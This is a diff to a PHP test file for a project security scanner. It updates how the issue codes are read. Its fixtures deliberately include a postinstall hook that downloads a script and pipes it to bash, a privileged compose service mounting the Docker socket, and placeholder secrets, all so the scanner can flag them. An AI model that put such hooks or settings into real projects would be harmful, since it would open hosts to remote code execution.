@@ -27,7 +27,7 @@ it('reports ready security posture when no issues are found', function () {
         '.gitignore' => ".env\n",
     ])));
 
-    expect($issues->all()[0]->code)->toBe('DD_SECURITY_READY');
+    expect($issues->all()[0]->code->value)->toBe('DD_SECURITY_READY');
 });
 
 it('reports env ignore gaps and secrets in example files', function () {
@@ -35,7 +35,7 @@ it('reports env ignore gaps and secrets in example files', function () {
         '.gitignore' => "vendor\n",
         '.env.example' => "PAYMENT_SECRET=abcdefghijklmnopqrstuvwxyz1234567890abcdefgh\n",
     ])));
-    $codes = array_map(static fn ($issue): string => $issue->code, $issues->all());
+    $codes = array_map(static fn ($issue): string => $issue->code->value, $issues->all());
 
     expect($codes)->toContain('DD_SECURITY_ENV_NOT_IGNORED')
         ->and($codes)->toContain('DD_SECURITY_SECRET_IN_EXAMPLE');
@@ -47,7 +47,7 @@ it('reports risky scripts and compose settings', function () {
         'package.json' => '{"scripts":{"postinstall":"wget https://example.com/a.sh | bash"}}',
         'compose.yml' => "services:\n  app:\n    privileged: true\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n",
     ])));
-    $codes = array_map(static fn ($issue): string => $issue->code, $issues->all());
+    $codes = array_map(static fn ($issue): string => $issue->code->value, $issues->all());
 
     expect($codes)->toContain('DD_SECURITY_RISKY_COMPOSER_SCRIPT')
         ->and($codes)->toContain('DD_SECURITY_RISKY_PACKAGE_SCRIPT')
@@ -60,6 +60,6 @@ it('reports hard coded secret patterns', function () {
         'config/app.php' => "<?php\nreturn ['api_key' => 'abcdefghijklmnopqrstuvwxyz1234567890'];",
     ])));
 
-    expect(array_map(static fn ($issue): string => $issue->code, $issues->all()))
+    expect(array_map(static fn ($issue): string => $issue->code->value, $issues->all()))
         ->toContain('DD_SECURITY_SECRET_PATTERN');
 });
